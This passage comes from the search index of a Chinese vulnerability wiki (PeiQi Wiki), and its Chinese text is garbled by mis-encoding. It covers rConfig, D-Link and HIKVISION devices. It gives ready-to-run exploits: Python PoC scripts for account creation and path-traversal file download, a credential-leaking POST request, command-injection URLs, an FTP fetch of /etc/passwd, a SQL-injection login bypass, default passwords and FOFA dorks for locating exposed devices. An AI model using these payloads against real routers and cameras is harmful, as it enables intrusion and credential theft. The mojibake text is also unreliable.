) headers = {'Content-Type': multipart_data.content_type, \"Upgrade-Insecure-Requests\": \"1\", \"Referer\": referer, \"Origin\": origin} cookies = {'PHPSESSID': 'testtest{}'.format(ran_number)} print(\"\\033[36m[o] æ­£åœ¨åˆ›å»ºè´¦æˆ·..... \\033[0m\".format(ran_number, ran_number)) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(vuln_url, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False) if \"error\" not in response.text: print(\"\\033[36m[o] æˆåŠŸåˆ›å»ºè´¦æˆ· testtest{}/testtest@{} \\033[0m\".format(ran_number, ran_number)) else: print(\"\\033[31m[x] åˆ›å»ºå¤±è´¥:{} \\033[0m\") except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) # if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 20:21:11 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/rConfig/rConfig useradmin.inc.php ä¿¡æ¯æ³„éœ²æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/rConfig/rConfig useradmin.inc.php ä¿¡æ¯æ³„éœ²æ¼æ´.html","title":"rConfig useradmin.inc.php ä¿¡æ¯æ³„éœ²æ¼æ´","keywords":"","body":"rConfig useradmin.inc.php ä¿¡æ¯æ³„éœ²æ¼æ´ æ¼æ´æè¿° rConfig useradmin.inc.php å­˜åœ¨ä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œé€šè¿‡è®¿é—®æ–‡ä»¶è·å–ç”¨æˆ·é‚®ç®±ä¿¡æ¯å’Œç™»å½•å æ¼æ´å½±å“ [!NOTE] rConfig FOFA [!NOTE] app=\"rConfig\" æ¼æ´å¤ç° å‡ºç°æ¼æ´çš„æ–‡ä»¶ query(\"SELECT timeZone FROM settings\"); $result = $db2->resultsetCols(); $timeZone = $result[0]; date_default_timezone_set($timeZone); /* Get Row count from users where NOT deleted */ $db2->query('SELECT COUNT(*) AS total FROM users WHERE status = 1'); $row = $db2->resultsetCols(); $result[\"total\"] = $row[0]; /* Instantiate Paginator Class */ $pages = new Paginator; $pages->items_total = $result['total']; $pages->mid_range = 7; // Number of pages to display. Must be odd and > 3 $pages->paginate(); echo $pages->display_pages(); echo \"\" . $pages->display_jump_menu() . $pages->display_items_per_page() . \"\"; /* GET all nodes records from DB */ $db2->query(\"SELECT id, username, userlevel, email, timestamp FROM users WHERE status = 1 $pages->limit\"); $resultSelect = $db2->resultset(); // push rows to $itesm array $items = array(); foreach ($resultSelect as $row) { array_push($items, $row); } /* Create Multidimensional array for use later */ $result[\"rows\"] = $items; $i = 0; # row counter to enable alternate row coloring ?> Username E-mail User Level Last Login '; ?> \"/> display_pages(); echo \"\"; echo \"Page: $pages->current_page of $pages->num_pages\\n\"; æ–‡ä»¶æ²¡æœ‰è®¾å®šæƒé™ï¼Œä»»ä½•äººå¯ä»¥è®¿é—®æ³„éœ²ä¿¡æ¯ æ¼æ´éªŒè¯çš„Urlä¸º /useradmin.inc.php æ³„éœ²ç”¨æˆ·ä¿¡æ¯ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/D-Link/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/D-Link/","title":"D-Link","keywords":"","body":"D-Link D-Link ACç®¡ç†ç³»ç»Ÿé»˜è®¤è´¦å·å¯†ç  D-Link Dir-645 getcfg.php è´¦å·å¯†ç æ³„éœ²æ¼æ´ CVE-2019-17506 D-Link DSL-28881A FTPé…ç½®é”™è¯¯ CVE-2020-24578 D-Link DSL-28881A æœªæˆæƒè®¿é—® CVE-2020-24579 D-Link DSL-28881A ä¿¡æ¯æ³„éœ² CVE-2020-24577 D-Link DSL-28881A è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-24581 D-Link DCSç³»åˆ—ç›‘æ§ è´¦å·å¯†ç ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-25078 D-Link ShareCenter DNS-320 system_mgr.cgi è¿œç¨‹å‘½ä»¤æ‰§è¡Œ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-05 18:06:55 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/D-Link/D-Link ACç®¡ç†ç³»ç»Ÿé»˜è®¤è´¦å·å¯†ç .html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/D-Link/D-Link ACç®¡ç†ç³»ç»Ÿé»˜è®¤è´¦å·å¯†ç .html","title":"D-Link ACç®¡ç†ç³»ç»Ÿé»˜è®¤è´¦å·å¯†ç ","keywords":"","body":"D-Link ACç®¡ç†ç³»ç»Ÿé»˜è®¤è´¦å·å¯†ç  æ¼æ´æè¿° D-Link ACç®¡ç†ç³»ç»Ÿå­˜åœ¨é»˜è®¤è´¦å·å¯†ç ï¼Œå¯è¢«è·å–æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] D-Link ACç®¡ç†ç³»ç»Ÿ FOFA [!NOTE] \"ACé›†ä¸­ç®¡ç†å¹³å°\" && body=\"D-Linkè·¯ç”±å™¨ç®¡ç†é¡µ\" æ¼æ´å¤ç° é»˜è®¤å£ä»¤ä¸º admin:admin Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ D_Link_AC_Centralized_management_system__Default_weak_password.json PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/D-Link/D-Link Dir-645 getcfg.php è´¦å·å¯†ç æ³„éœ²æ¼æ´ CVE-2019-17506.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/D-Link/D-Link Dir-645 getcfg.php è´¦å·å¯†ç æ³„éœ²æ¼æ´ CVE-2019-17506.html","title":"D-Link Dir-645 getcfg.php è´¦å·å¯†ç æ³„éœ²æ¼æ´ CVE-2019-17506","keywords":"","body":"D-Link Dir-645 getcfg.php è´¦å·å¯†ç æ³„éœ²æ¼æ´ CVE-2019-17506 æ¼æ´æè¿° D-Link DIR-868L B1-2.03å’ŒDIR-817LW A1-1.04è·¯ç”±å™¨ä¸Šæœ‰ä¸€äº›ä¸éœ€è¦èº«ä»½éªŒè¯çš„Webç•Œé¢ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡SERVICESçš„DEVICE.ACCOUNTå€¼ä»¥åŠAUTHORIZED_GROUP = 1ï¼…0aæ¥è·å–getcfg.phpçš„è·¯ç”±å™¨çš„ç”¨æˆ·åå’Œå¯†ç ï¼ˆä»¥åŠå…¶ä»–ä¿¡æ¯ï¼‰ã€‚è¿™å¯ç”¨äºè¿œç¨‹æ§åˆ¶è·¯ç”±å™¨ æ¼æ´å½±å“ [!NOTE] D-Link Dir ç³»åˆ—å¤šä¸ªç‰ˆæœ¬ FOFA [!NOTE] app=\"D_Link-DIR-868L\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å‘é€å¦‚ä¸‹è¯·æ±‚åŒ… POST /getcfg.php HTTP/1.1 Host: Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Content-Length: 61 SERVICES=DEVICE.ACCOUNT&attack=ture%0D%0AAUTHORIZED_GROUP%3D1 è·å–åˆ°è·¯ç”±å™¨è´¦å·å¯†ç å³å¯ç™»å½•åå° Goby & POC PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/D-Link/D-Link DSL-28881A ä¿¡æ¯æ³„éœ² CVE-2020-24577.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/D-Link/D-Link DSL-28881A ä¿¡æ¯æ³„éœ² CVE-2020-24577.html","title":"D-Link DSL-28881A ä¿¡æ¯æ³„éœ² CVE-2020-24577","keywords":"","body":"D-Link DSL-28881A ä¿¡æ¯æ³„éœ² CVE-2020-24577 æ¼æ´æè¿° é€šè¿‡ç‰©ç†è¿æ¥æˆ–æ— çº¿è®¿é—®å»ºç«‹ä¸ç½‘ç»œçš„è¿æ¥åï¼Œæ¶æ„ç”¨æˆ·å¯ä»¥é€šè¿‡ç›´æ¥æµè§ˆä»¥ä¸‹URLæ¥è·å–çº¯æ–‡æœ¬æ ¼å¼çš„Internetæä¾›å•†è¿æ¥ç”¨æˆ·åå’Œå¯†ç ï¼Œä»¥åŠæ— çº¿è·¯ç”±å™¨çš„çº¯æ–‡æœ¬æ ¼å¼çš„ç”¨æˆ·åå’Œå¯†ç  æ¼æ´å½±å“ [!NOTE] D-Link DSL-2888A FOFA [!NOTE] body=\"DSL-2888A\" æ¼æ´å¤ç° ç™»å½•é¡µé¢è¾“å…¥ä»»æ„å¯†ç å»ºç«‹è¿æ¥ è·³è½¬åˆ° http://xxx.xxx.xxx.xxx/page/login/login.html?error=fail æ˜¾ç¤ºå¯†ç é”™è¯¯ è®¿é—®ä¸‹åˆ—ä¸¤ä¸ªè¿æ¥ http://xxx.xxx.xxx.xxx:8008/tmp/cfg/lib_cfg_cfgcmd http://xxx.xxx.xxx.xxx:8008/tmp/.nvram [!NOTE] è¿æ¥Wiflæˆ–ç‰©ç†è¿æ¥Wifiæ‰èƒ½è®¿é—® PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/D-Link/D-Link DSL-28881A FTPé…ç½®é”™è¯¯ CVE-2020-24578.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/D-Link/D-Link DSL-28881A FTPé…ç½®é”™è¯¯ CVE-2020-24578.html","title":"D-Link DSL-28881A FTPé…ç½®é”™è¯¯ CVE-2020-24578","keywords":"","body":"D-Link DSL-28881A FTPé…ç½®é”™è¯¯ CVE-2020-24578 æ¼æ´æè¿° D-Link DSL-2888Aè·¯ç”±å™¨å…·æœ‰æ–‡ä»¶å…±äº«åŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½å…è®¸ç”¨æˆ·é€šè¿‡å°†å¤–éƒ¨é©±åŠ¨å™¨æ’å…¥è·¯ç”±å™¨æ¥ä¸å…¶ä»–ç½‘ç»œç”¨æˆ·å…±äº«æ–‡ä»¶ã€‚ç„¶åé€šè¿‡FTPï¼ˆæ–‡ä»¶ä¼ è¾“åè®®ï¼‰å…±äº«ã€‚ä½†æ˜¯ï¼ŒFTPæœåŠ¡å…è®¸ç½‘ç»œç”¨æˆ·è½¬ä¹‰å…±äº«æ–‡ä»¶å¤¹ä»¥è®¿é—®è·¯ç”±å™¨æ–‡ä»¶ç³»ç»Ÿå¹¶ä¸‹è½½ä½äºæ ¹æ–‡ä»¶å¤¹ä¸­çš„å…¶ä»–æ–‡ä»¶ã€‚ æ¼æ´å½±å“ [!NOTE] D-Link DSL-2888A FOFA [!NOTE] body=\"DSL-2888A\" æ¼æ´å¤ç° å‰æä¸ºä½¿ç”¨ D-Link DSL-28881A ä¿¡æ¯æ³„éœ² CVE-2020-24577 è·å–FTPå‡­è¯ ä»¥ä¸‹æä¾›äº†ä¸‹è½½â€œ passwdâ€çš„ç¤ºä¾‹ï¼š åœ¨FTPå®¢æˆ·ç«¯ä¸Šä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä»¥æœ‰æ•ˆçš„å‡­æ®ï¼ˆä»Finding-2è·å¾—ï¼‰è¿æ¥åˆ°FTPæœåŠ¡ã€‚ ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯¼èˆªåˆ°æ ¹æ–‡ä»¶å¤¹ã€‚ ftp xxx.xxx.xxx.xxx ftp> cd etc ftp> get passwd PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/D-Link/D-Link DSL-28881A æœªæˆæƒè®¿é—® CVE-2020-24579.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/D-Link/D-Link DSL-28881A æœªæˆæƒè®¿é—® CVE-2020-24579.html","title":"D-Link DSL-28881A æœªæˆæƒè®¿é—® CVE-2020-24579","keywords":"","body":"D-Link DSL-28881A æœªæˆæƒè®¿é—® CVE-2020-24579 æ¼æ´æè¿° è·¯ç”±å™¨Webé—¨æˆ·çš„èº«ä»½éªŒè¯ä¸è¶³ï¼Œæ— æ³•è®¿é—®ä»»ä½•ç»è¿‡èº«ä»½éªŒè¯çš„ç®¡ç†é¡µé¢ï¼Œè€Œæ— éœ€è¾“å…¥æ­£ç¡®çš„å¯†ç ã€‚ä½äºåŒä¸€ç½‘ç»œä¸Šçš„æ¶æ„ç”¨æˆ·å¯ä»¥ä½¿ç”¨æ— æ•ˆçš„å‡­æ®ç›´æ¥æµè§ˆåˆ°ä»»ä½•ç»è¿‡èº«ä»½éªŒè¯çš„ç®¡ç†é¡µé¢ã€‚ æ¼æ´å½±å“ [!NOTE] D-Link DSL-2888A FOFA [!NOTE] body=\"DSL-2888A\" æ¼æ´å¤ç° ç™»å½•é¡µé¢è¾“å…¥ä»»æ„å¯†ç å»ºç«‹è¿æ¥ è·³è½¬åˆ° http://xxx.xxx.xxx.xxx/page/login/login.html?error=fail æ˜¾ç¤ºå¯†ç é”™è¯¯ å†è¯·æ±‚URL http://xxx.xxx.xxx.xxx/WiFi.shtml æœªæˆæƒè®¿é—®åå° PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/D-Link/D-Link DSL-28881A è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-24581.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/D-Link/D-Link DSL-28881A è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-24581.html","title":"D-Link DSL-28881A è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-24581","keywords":"","body":"D-Link DSL-28881A è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-24581 æ¼æ´æè¿° D-Link DSL-2888A AU_2.31_V1.1.47ae55ä¹‹å‰ç‰ˆæœ¬å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œè¯¥æ¼æ´æºäºåŒ…å«ä¸€ä¸ªexecute cmd.cgiç‰¹æ€§(ä¸èƒ½é€šè¿‡webç”¨æˆ·ç•Œé¢è®¿é—®)ï¼Œè¯¥ç‰¹æ€§å…è®¸ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚ åœ¨è¯¥ç‰ˆæœ¬å›ºä»¶ä¸­åŒæ—¶å­˜åœ¨ç€ä¸€ä¸ªä¸å®‰å…¨è®¤è¯æ¼æ´ï¼ˆCVE-2020-24580ï¼‰ï¼Œåœ¨ç™»å½•ç•Œé¢è¾“å…¥ä»»æ„å¯†ç å°±å¯ä»¥æˆåŠŸè®¿é—®è·¯ç”±å™¨ç•Œé¢ã€‚ æ¼æ´å½±å“ [!NOTE] D-Link DSL-2888A FOFA [!NOTE] body=\"DSL-2888A\" æ¼æ´å¤ç° ç™»å½•é¡µé¢è¾“å…¥ä»»æ„å¯†ç å»ºç«‹è¿æ¥ è·³è½¬åˆ° http://xxx.xxx.xxx.xxx/page/login/login.html?error=fail æ˜¾ç¤ºå¯†ç é”™è¯¯ æ¼æ´å‡ºç°åœ¨ execute_cmd.cgi æ–‡ä»¶ä¸­ #!/bin/sh . /usr/syscfg/api_log.sh cmd=`echo ${QUERY_STRING} | cut -d = -f 3` cmd=`echo ${cmd} | tr \"%20\" \" \"` result=`${cmd}` TGP_Log ${TGP_LOG_WARNING} \"cmd=${cmd}, result=${result}\" echo \"Content-type: text/html\" echo \"\" echo -n ${result} è¿™é‡Œå–å‡º ${QUERY_STRING} ä¸­çš„ç¬¬äºŒä¸ªå‚æ•°å€¼ï¼Œç„¶åå»é™¤ç©ºæ ¼å‘½ä»¤æ‰§è¡Œ åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰è¿‡æ»¤ï¼Œçœ‹ä¸€ä¸‹å‚æ•°ä»å“ªæ¥çš„ æ–‡ä»¶ /www/js/ajax.js get : function(_dataType) { var _url = this.url; if(_url.indexOf('?') == -1) _url += '?timestamp=' + new Date().getTime(); else _url += \"&timestamp=\" + new Date().getTime(); if(this.queryString.length > 0) _url += \"&\" + this.queryString; this.xmlHttp.open(\"GET\", _url, true); /* will make IE11 fail. if(!document.all){ if(_dataType == \"xml\") this.xmlHttp.overrideMimeType(\"text/xml;charset=utf8\"); else this.xmlHttp.overrideMimeType(\"text/html;charset=gb2312\");//è®¾å®šä»¥gb2312ç¼–ç è¯†åˆ«æ•°æ® } */ this.xmlHttp.send(null); }, çœ‹ä¸€ä¸‹è¿‡ç¨‹ â”Œâ”€â”€(root)-[/tmp] â””â”€# echo \"timestamp=1589333279490&cmd=whoami\" | cut -d = -f 3 whoami è¿™é‡Œå–ç¬¬äºŒä¸ªå‚æ•° whoami ç„¶åå°±æ²¡æœ‰è¿‡æ»¤çš„æ‰§è¡Œäº† æ‰€ä»¥EXPä¸º: http://xxx.xxx.xxx.xxx/cgi-bin/execute_cmd.cgi?timestamp=test&cmd=whoami PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 18:59:19 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/D-Link/D-Link DCSç³»åˆ—ç›‘æ§ è´¦å·å¯†ç ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-25078.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/D-Link/D-Link DCSç³»åˆ—ç›‘æ§ è´¦å·å¯†ç ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-25078.html","title":"D-Link DCSç³»åˆ—ç›‘æ§ è´¦å·å¯†ç ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-25078","keywords":"","body":"D-Link DCSç³»åˆ—ç›‘æ§ è´¦å·å¯†ç ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-25078 æ¼æ´æè¿° D-Link DCSç³»åˆ—ç›‘æ§ é€šè¿‡è®¿é—®ç‰¹å®šçš„URLå¾—åˆ°è´¦å·å¯†ç ä¿¡æ¯ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´è¿›å…¥åå°å¯ä»¥è·å–è§†é¢‘ç›‘æ§é¡µé¢ æ¼æ´å½±å“ [!NOTE] DCS-2530L DCS-2670L DCS-4603 DCS-4622 DCS-4701E DCS-4703E DCS-4705E DCS-4802E DCS-P703 FOFA [!NOTE] app=\"D_Link-DCS-2530L\" æ¼æ´å¤ç° è®¿é—®ç™»å½•é¡µé¢å¦‚ä¸‹ å‡ºç°æ¼æ´çš„ Url ä¸º, å…¶ä¸­æ³„éœ²äº†è´¦å·å¯†ç  http://xxx.xxx.xxx.xxx/config/getuser?index=0 ä½¿ç”¨æ³„éœ²çš„è´¦å·å¯†ç ç™»é™†ç³»ç»Ÿ Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ D_Link_DC_Disclosure_of_account_password_information PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/D-Link/D-Link ShareCenter DNS-320 system_mgr.cgi è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/D-Link/D-Link ShareCenter DNS-320 system_mgr.cgi è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"D-Link ShareCenter DNS-320 system_mgr.cgi è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"D-Link ShareCenter DNS-320 system_mgr.cgi è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° D-Link ShareCenter DNS-320 system_mgr.cgi å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥æ§åˆ¶æœåŠ¡å™¨ æ¼æ´å½±å“ [!NOTE] D-Link ShareCenter DNS-320 FOFA [!NOTE] app=\"D_Link-DNS-ShareCenter\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ æ¼æ´POCä¸º /cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;ls; PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-05 18:13:59 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/D-Link/D-Link DSR-250N ä¸‡èƒ½å¯†ç æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/D-Link/D-Link DSR-250N ä¸‡èƒ½å¯†ç æ¼æ´.html","title":"D-Link DSR-250N ä¸‡èƒ½å¯†ç æ¼æ´","keywords":"","body":"D-Link DSR-250N ä¸‡èƒ½å¯†ç æ¼æ´ æ¼æ´æè¿° D-Link DSR-250N å­˜åœ¨ä¸‡èƒ½å¯†ç æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥è·å–åå°æƒé™ æ¼æ´å½±å“ [!NOTE] D-Link DSR-250N FOFA [!NOTE] app=\"D_Link-DSR-250N\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ user: admin pass: ' or '1'='1 æˆåŠŸç™»å½•åå° PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-09 17:51:52 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/HIKVISION/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/HIKVISION/","title":"HIKVISION","keywords":"","body":"HIKVISION HIKVISION è§†é¢‘ç¼–ç è®¾å¤‡æ¥å…¥ç½‘å…³ ä»»æ„æ–‡ä»¶ä¸‹è½½ HIKVISION æµåª’ä½“ç®¡ç†æœåŠ¡å™¨ åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2021-14544 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-25 21:13:52 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/HIKVISION/HIKVISION è§†é¢‘ç¼–ç è®¾å¤‡æ¥å…¥ç½‘å…³ ä»»æ„æ–‡ä»¶ä¸‹è½½.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/HIKVISION/HIKVISION è§†é¢‘ç¼–ç è®¾å¤‡æ¥å…¥ç½‘å…³ ä»»æ„æ–‡ä»¶ä¸‹è½½.html","title":"HIKVISION è§†é¢‘ç¼–ç è®¾å¤‡æ¥å…¥ç½‘å…³ ä»»æ„æ–‡ä»¶ä¸‹è½½","keywords":"","body":"HIKVISION è§†é¢‘ç¼–ç è®¾å¤‡æ¥å…¥ç½‘å…³ ä»»æ„æ–‡ä»¶ä¸‹è½½ æ¼æ´æè¿° æµ·åº·å¨è§†è§†é¢‘æ¥å…¥ç½‘å…³ç³»ç»Ÿåœ¨é¡µé¢/serverLog/downFile.phpçš„å‚æ•°fileNameå­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ æ¼æ´å½±å“ [!NOTE] HIKVISION è§†é¢‘ç¼–ç è®¾å¤‡æ¥å…¥ç½‘å…³ FOFA [!NOTE] title=\"è§†é¢‘ç¼–ç è®¾å¤‡æ¥å…¥ç½‘å…³\" æ¼æ´å¤ç° æ¼æ´æ–‡ä»¶ä¸º downFile.php, å…¶ä¸­ å‚æ•° fileName æ²¡æœ‰è¿‡æ»¤å±é™©å­—ç¬¦ï¼Œå¯¼è‡´å¯æ–‡ä»¶éå†ä¸‹è½½ alert(\"æ–‡ä»¶ä¸å­˜åœ¨!\");window.history.back(-1);'; exit(); }else{ $file = fopen($file_dir . $file_name,\"r\"); // æ‰“å¼€æ–‡ä»¶ // è¾“å…¥æ–‡ä»¶æ ‡ç­¾ Header(\"Content-type: application/octet-stream\"); Header(\"Accept-Ranges: bytes\"); Header(\"Accept-Length: \".filesize($file_dir . $file_name)); Header(\"Content-Disposition: attachment; filename=\" . $file_name); // è¾“å‡ºæ–‡ä»¶å†…å®¹ echo fread($file,filesize($file_dir.$file_name)); fclose($file); exit(); } ?> è®¿é—® http://xxx.xxx.xxx.xxx/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php ä¸‹è½½æ–‡ä»¶ æ¼æ´åˆ©ç”¨POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: HIKVISION è§†é¢‘ç¼–ç è®¾å¤‡æ¥å…¥ç½‘å…³ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] æ­£åœ¨è¯·æ±‚ {}/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php \\033[0m\".format(target_url)) if \"$file_name\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´ ,æˆåŠŸè¯»å– downFile.php \\033[0m\".format(target_url)) print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] ä¸å­˜åœ¨æ¼æ´ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ HIKVISION_Video_coding_equipment_Download_any_file PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/HIKVISION/HIKVISION æµåª’ä½“ç®¡ç†æœåŠ¡å™¨ åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2021-14544.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/HIKVISION/HIKVISION æµåª’ä½“ç®¡ç†æœåŠ¡å™¨ åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2021-14544.html","title":"HIKVISION æµåª’ä½“ç®¡ç†æœåŠ¡å™¨ åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2021-14544","keywords":"","body":"HIKVISION æµåª’ä½“ç®¡ç†æœåŠ¡å™¨ åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CNVD-2021-14544 æ¼æ´æè¿° 